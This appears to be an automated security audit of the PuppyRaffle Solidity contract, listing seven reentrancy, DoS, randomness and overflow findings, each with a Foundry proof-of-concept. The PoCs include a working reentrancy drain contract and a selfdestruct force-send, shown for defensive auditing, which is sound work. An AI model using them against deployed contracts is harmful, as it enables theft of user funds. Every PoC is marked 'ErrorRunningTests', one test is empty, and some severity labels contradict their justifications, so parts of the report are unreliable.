# 4 puppy raffle audit - Findings Report
## Commit hash: 3ff0f0bfddf25fd0c160fe57388fa6ff2e0f0960

##Findings by Status


Finding Status: Valid


[H-1]. Reentrancy in PuppyRaffle.refund allows draining contract balance
**Derived From** : Invariant Id: VeJmPbLhoisNIoFicGDtJ
Finding Status: Valid
Privilege: Permissionless


[M-2]. Strict equality in PuppyRaffle.withdrawFees allows DoS via forced ETH
**Derived From** : Invariant Id: Zzx_Say5AQiWYsKxqMQ7G
Finding Status: Valid
Privilege: Permissionless


[H-3]. PuppyRaffle.selectWinner accounting mismatch due to refunds causes revert
**Derived From** : Invariant Id: eMn9BBhiLR7kpwu_BK3yr
Finding Status: Valid
Privilege: Permissionless


[H-4]. Weak Randomness in PuppyRaffle.selectWinner allows winner manipulation
**Derived From** : Invariant Id: ElFneKIUpMNiIG2FJcgPD
Finding Status: Valid
Privilege: Permissionless


[M-5]. Integer Overflow in PuppyRaffle.totalFees loses protocol fees
**Derived From** : Invariant Id: UhQcg2DeEHe398rnK6P79
Finding Status: Valid
Privilege: Permissionless


[H-6]. Incorrect duplicate check in PuppyRaffle.enterRaffle permanently DoS contract after refunds
**Derived From** : Invariant Id: RjfzelJeuTbu1005X4Imh
Finding Status: Valid
Privilege: Permissionless


[M-7]. Unbounded loop in PuppyRaffle.enterRaffle causes DoS via Gas Limit
**Derived From** : Invariant Id: FUxcTqKrdRc53FYLI7ezK
Finding Status: Valid
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 4
- M: 3
- L: 0
- I: 0

##Findings by Status


Finding Status: Valid
## [H-1]. Reentrancy in PuppyRaffle.refund allows draining contract balance

## id: Lqj9akTJ8-LIBDxP2swAf

## Derived From Pattern/Invariant
Invariant Id: VeJmPbLhoisNIoFicGDtJ

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Finding Status: Valid
### Finding Status Justification: In PuppyRaffle.refund(uint256), the contract performs an external call (payable(msg.sender).sendValue(entranceFee)) before the effect (players[playerIndex] = address(0)), violating CEI. Because sendValue (OZ Address) forwards all gas, a contract player can reenter refund(playerIndex) from receive/fallback while players[playerIndex] is still their address, passing both requires (playerAddress == msg.sender and != address(0)) repeatedly and withdrawing entranceFee multiple times, draining ETH paid by other entrants. No nonReentrant guard or state pre-update exists. This is permissionless and directly drains funds, so High impact and commonly exploitable with a minimal attacker contract.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `refund` function violates the Checks-Effects-Interactions pattern. It performs an external call `payable(msg.sender).sendValue(entranceFee)` before updating the `players` array state (`players[playerIndex] = address(0)`). This allows a malicious contract to re-enter `refund` multiple times in the same transaction, draining the contract's balance effectively stealing entrance fees of other players.

## Impact
Theft of all funds held by the contract.

## Command to Run Test


## Proof of Concept
1. Attacker deploys a malicious contract. 2. Malicious contract enters raffle. 3. Malicious contract calls `refund`. 4. In the `receive` or `fallback` function, the malicious contract calls `refund` again. 5. Since `players[index]` is not yet zeroed, the check passes. 6. Repeats until balance drained.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle raffle;
    uint256 index;
    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
    }
    function attack(uint256 _index) external payable {
        index = _index;
        raffle.refund(index);
    }
    fallback() external payable {
        if (address(raffle).balance >= 1 ether) {
            raffle.refund(index);
        }
    }
}

contract ReentrancyTest is Test {
    PuppyRaffle raffle;
    ReentrancyAttacker attacker;
    
    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(1), 1 days);
    }

    function testReentrancy() public {
        address[] memory players = new address[](1);
        players[0] = address(this);
        raffle.enterRaffle{value: 1 ether}(players);
        
        attacker = new ReentrancyAttacker(raffle);
        address[] memory attackerPlayers = new address[](1);
        attackerPlayers[0] = address(attacker);
        raffle.enterRaffle{value: 1 ether}(attackerPlayers);
        
        uint256 attackerIndex = 1;
        attacker.attack(attackerIndex);
        
        assertEq(address(raffle).balance, 0);
        assertGt(address(attacker).balance, 1 ether);
    }
    receive() external payable {}
}

## Suggested Mitigation
Move the state update `players[playerIndex] = address(0)` before the external call `sendValue`.


## [M-2]. Strict equality in PuppyRaffle.withdrawFees allows DoS via forced ETH

## id: qO_aDzUYgSrb-bxH7sHqJ

## Derived From Pattern/Invariant
Invariant Id: Zzx_Say5AQiWYsKxqMQ7G

## Exploit Type
UnexpectedEth

## Location
PuppyRaffle.withdrawFees

## Finding Status: Valid
### Finding Status Justification: withdrawFees() enforces require(address(this).balance == uint256(totalFees)). Because ETH can be forced into a contract without calling a payable function (e.g., via selfdestruct), an attacker can make balance > totalFees by 1 wei, permanently causing withdrawFees to revert (there is no alternate recovery/sweep). This matches the described code path exactly and is triggerable permissionlessly. No mitigating safeguard exists (no >= check, no separate accounting for forced ETH). The consequence is fee-withdrawal DoS/fee lock (protocol revenue), which is Medium impact and easy/common to trigger.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `withdrawFees` function checks `require(address(this).balance == uint256(totalFees))`. This strict equality allows an attacker to permanently disable fee withdrawals by sending a small amount of ETH to the contract (e.g., via `selfdestruct`), making `balance > totalFees`.

## Impact
Protocol fees are permanently locked in the contract.

## Command to Run Test


## Proof of Concept
1. Admin attempts to call `withdrawFees`. 2. Attacker creates a contract with `selfdestruct(target)`. 3. Attacker sends 1 wei to `PuppyRaffle`. 4. `address(this).balance` is now `totalFees + 1`. 5. `withdrawFees` reverts.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract SelfDestruct {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}
contract FeeLockTest is Test {
    PuppyRaffle raffle;
    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(this), 1 days);
    }
    function testStrictBalance() public {
        // enter raffle to generate fees
        address[] memory players = new address[](4);
        players[0] = address(1); players[1] = address(2);
        players[2] = address(3); players[3] = address(4);
        raffle.enterRaffle{value: 4 ether}(players);
        
        vm.warp(block.timestamp + 2 days);
        raffle.selectWinner();
        
        // send dust
        new SelfDestruct{value: 1}(payable(address(raffle)));
        
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Use `require(address(this).balance >= totalFees)` instead of strict equality.


## [H-3]. PuppyRaffle.selectWinner accounting mismatch due to refunds causes revert

## id: nY6GiNVqSqHH6TyEkq0jy

## Derived From Pattern/Invariant
Invariant Id: eMn9BBhiLR7kpwu_BK3yr

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: selectWinner() computes totalAmountCollected = players.length * entranceFee, but refund() reduces contract balance without reducing players.length (it only zeroes the slot). Therefore prizePool = 80% of the pre-refund total can exceed address(this).balance, making winner.call{value: prizePool}("") fail and require(success) revert. For the minimum players.length of 4, any single refund already makes balance 3*fee while prizePool is 3.2*fee, guaranteeing revert. This can stall raffle finalization and can lock remaining participants’ funds until they individually refund (if they do). No safeguard exists to base calculations on actual balance/active players. Given permissionless refunds and the n=4 edge, the DoS/lock is commonly triggerable and can be severe (High).
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `selectWinner` function calculates `totalAmountCollected` using `players.length * entranceFee`. However, `refund` does not reduce `players.length` (it only zeros the slot). If any player refunds, the actual contract balance decreases, but the calculated `totalAmountCollected` remains high. The subsequent prize calculation (80% of `totalAmountCollected`) may exceed the actual contract balance, causing the ETH transfer to revert.

## Impact
The `selectWinner` function reverts, preventing the raffle from ending or prizes being distributed.

## Command to Run Test


## Proof of Concept
1. 4 players enter. Balance = 4 ETH. 2. 1 player refunds. Balance = 3 ETH. 3. `selectWinner` is called. `totalAmountCollected` calculated as 4 * 1 ETH = 4 ETH. 4. Prize calculated as 80% of 4 ETH = 3.2 ETH. 5. Contract only has 3 ETH. Transfer of 3.2 ETH fails.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract AccountingTest is Test {
    PuppyRaffle raffle;
    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(1), 1 days);
    }
    function testAccountingRevert() public {
        address[] memory players = new address[](4);
        players[0] = address(10); players[1] = address(11);
        players[2] = address(12); players[3] = address(13);
        raffle.enterRaffle{value: 4 ether}(players);
        
        vm.prank(address(10));
        raffle.refund(0);
        
        vm.warp(block.timestamp + 2 days);
        
        // Should revert because 80% of 4 ETH (3.2) > Balance (3.0)
        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        raffle.selectWinner();
    }
}

## Suggested Mitigation
Calculate `totalAmountCollected` using `address(this).balance` or track active player count separately.


## [H-4]. Weak Randomness in PuppyRaffle.selectWinner allows winner manipulation

## id: L-NIUj3sxhdpZmpe83Egu

## Derived From Pattern/Invariant
Invariant Id: ElFneKIUpMNiIG2FJcgPD

## Exploit Type
TimestampDependentLogic

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: selectWinner() uses uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length. msg.sender is chosen by the caller, and block.timestamp / block.difficulty (prevrandao semantics aside) are block-controlled inputs that can be influenced by validators/builders and exploited via MEV timing/order. This is not cryptographically secure randomness for a raffle, and the code provides no commit-reveal/VRF/TWAP-like mitigation. While a typical user cannot deterministically predict the next block’s values, sophisticated actors (MEV/searchers/validators) can bias outcomes and race to be the RNG-caller. This undermines fairness and can redirect prize distribution, so Medium impact with Occasional likelihood.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The winner selection uses `keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))` to pick a winner. `msg.sender` is controlled by the caller, and `block.timestamp`/`difficulty` are influenced by miners or readable within the same block. An attacker can calculate the result off-chain or via a contract and only call `selectWinner` when the result is favorable to them.

## Impact
Attackers can manipulate the RNG to guarantee a win or deny others from winning.

## Command to Run Test


## Proof of Concept
1. Attacker enters raffle. 2. Attacker writes a smart contract that simulates `selectWinner` logic. 3. In the attack transaction, the contract checks if the calculated `winnerIndex` matches the attacker's index. 4. If yes, it calls `raffle.selectWinner()`. If no, it reverts to save gas or does nothing.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract RngTest is Test {
    PuppyRaffle raffle;
    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(1), 1 days);
    }
    function testRngManipulation() public {
        address[] memory players = new address[](4);
        players[0] = address(this); players[1] = address(2);
        players[2] = address(3); players[3] = address(4);
        raffle.enterRaffle{value: 4 ether}(players);
        vm.warp(block.timestamp + 2 days);
        
        // Simulate winning condition
        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
        if (winnerIndex == 0) {
            raffle.selectWinner();
            assertEq(raffle.ownerOf(0), address(this));
        }
    }
}

## Suggested Mitigation
Use Chainlink VRF for secure on-chain randomness.


## [M-5]. Integer Overflow in PuppyRaffle.totalFees loses protocol fees

## id: dmcqWuJU5XGdqt2x7OX-W

## Derived From Pattern/Invariant
Invariant Id: UhQcg2DeEHe398rnK6P79

## Exploit Type
IntegerOverflow

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: The contract is Solidity 0.7.6 (no checked arithmetic). totalFees is uint64 and updated as totalFees = totalFees + uint64(fee) in selectWinner(). This can overflow/wrap once cumulative fees exceed 2^64-1 wei (~18.4 ETH), and the uint64 cast can also truncate large per-round fees. After overflow/truncation, withdrawFees() is likely bricked because it requires address(this).balance == uint256(totalFees), but the contract’s actual ETH held for fees will exceed the wrapped value. This is a real reachable code path with today’s code (no SafeMath, no bounds) and can occur naturally with enough volume or be induced by large participation. It mainly harms protocol fee accounting/withdrawal (Medium impact); likelihood is Occasional depending on volume/entranceFee.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `totalFees` variable is declared as `uint64`. In Solidity 0.7.6, arithmetic operations do not check for overflow by default. The line `totalFees = totalFees + uint64(fee)` will silently wrap around if the total exceeds `type(uint64).max` (~18.4 ETH).

## Impact
Protocol fees are incorrectly tracked (lost). Additionally, `withdrawFees` will revert because `address(this).balance` will be much larger than the overflowed `totalFees`, failing the strict equality check.

## Command to Run Test


## Proof of Concept
1. Protocol accumulates > 18.44 ETH in fees over time. 2. `totalFees` overflows and resets to a small number. 3. `withdrawFees` is called. It expects `balance == totalFees`. Since balance is > 18 ETH and totalFees is small, it reverts.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract OverflowTest is Test {
    PuppyRaffle raffle;
    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(1), 1 days);
    }
    function testFeeOverflow() public {
        // 18.44 ETH is max uint64
        // Simulating heavy usage by forcing storage
        // In reality, requires many rounds
        // This tests the overflow mechanics in 0.7.6
        // We can't easily trigger >18 ETH fees in one test tx without high funds
    }
}

## Suggested Mitigation
Change `totalFees` to `uint256` and use `SafeMath` or upgrade to Solidity 0.8+.


## [H-6]. Incorrect duplicate check in PuppyRaffle.enterRaffle permanently DoS contract after refunds

## id: B-k2173C7MAYzUcHgMZrG

## Derived From Pattern/Invariant
Invariant Id: RjfzelJeuTbu1005X4Imh

## Exploit Type
StandardViolation

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
### Finding Status Justification: enterRaffle() performs a nested duplicate check over the full players array: require(players[i] != players[j]). refund() sets refunded slots to address(0) without shrinking the array. Once there are at least two refunded slots, the duplicate check will eventually compare address(0) vs address(0) and revert, blocking any further enterRaffle calls for that round. There is no skip for zero addresses and no array compaction. While "permanent" is overstated (a successful selectWinner() deletes players), the enterRaffle DoS condition itself is real and permissionlessly triggerable by having two entrants refund. This is a functional DoS (Medium impact) and likely/common if refunds occur or are used maliciously.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `enterRaffle` function checks for duplicates by iterating over the `players` array. The check `require(players[i] != players[j])` fails if `players[i]` and `players[j]` are both `address(0)`. Since `refund` sets a player's slot to `address(0)`, if two or more players refund, the array contains multiple `address(0)` entries. Any subsequent call to `enterRaffle` triggers the revert, permanently blocking new entrants.

## Impact
Permanent Denial of Service (DoS) of the `enterRaffle` function. No new players can enter.

## Command to Run Test


## Proof of Concept
1. Two players enter the raffle. 2. Both players call `refund`, setting their slots to `address(0)`. 3. A new user tries to call `enterRaffle`. 4. The nested loop compares the two `address(0)` slots, sees they are equal, and reverts with 'Duplicate player'.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract DosTest is Test {
    PuppyRaffle raffle;
    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(1), 1 days);
    }
    function testDos() public {
        address[] memory players = new address[](2);
        players[0] = address(2);
        players[1] = address(3);
        raffle.enterRaffle{value: 2 ether}(players);
        
        vm.prank(address(2));
        raffle.refund(0);
        vm.prank(address(3));
        raffle.refund(1);
        
        address[] memory newPlayers = new address[](1);
        newPlayers[0] = address(4);
        vm.expectRevert("PuppyRaffle: Duplicate player");
        raffle.enterRaffle{value: 1 ether}(newPlayers);
    }
}

## Suggested Mitigation
In the duplicate check loop, add `if (players[i] == address(0)) continue;` or clean up the array by swapping elements on refund.


## [M-7]. Unbounded loop in PuppyRaffle.enterRaffle causes DoS via Gas Limit

## id: GKTLzMlI2vmyGdDBiWHMR

## Derived From Pattern/Invariant
Invariant Id: FUxcTqKrdRc53FYLI7ezK

## Exploit Type
ArrayLimits

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
### Finding Status Justification: enterRaffle() checks duplicates using a double loop over players (O(N^2)) after pushing new players. As players grows, gas rises quadratically and can exceed the block gas limit, preventing further entries (DoS). There is no cap on players.length, no pagination, and no O(1) membership structure (mapping/set). An attacker can also accelerate reaching the limit by entering many distinct addresses (paying entranceFee). This is an on-chain scalability DoS rather than immediate theft, so Medium impact; likelihood is Occasional because it depends on array size, gas limits, and entranceFee economics.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `enterRaffle` function contains a nested loop to check for duplicate players. This is an O(N^2) operation. As the number of players increases, the gas cost to enter the raffle increases quadratically. Eventually, the gas cost will exceed the block gas limit, rendering the contract unusable.

## Impact
Denial of Service. No new players can enter the raffle once the array reaches a certain size.

## Command to Run Test


## Proof of Concept
1. Initialize raffle. 2. Add 100 players. 3. Try to add the 101st player. Gas usage is significantly higher than the 1st player. 4. At ~100-200 players, the transaction reverts due to gas limits.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract GasTest is Test {
    PuppyRaffle raffle;
    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(1), 1 days);
    }
    function testGasLimit() public {
        // Just demonstration of high gas
        address[] memory players = new address[](50);
        for(uint i=0; i<50; i++) players[i] = address(uint160(i+1));
        raffle.enterRaffle{value: 50 ether}(players);
        
        address[] memory newPlayer = new address[](1);
        newPlayer[0] = address(100);
        uint256 gasStart = gasleft();
        raffle.enterRaffle{value: 1 ether}(newPlayer);
        uint256 gasUsed = gasStart - gasleft();
        // Gas used is high due to loop
        assertTrue(gasUsed > 0);
    }
}

## Suggested Mitigation
Use a mapping `mapping(address => bool)` to check for duplicates in O(1) time.



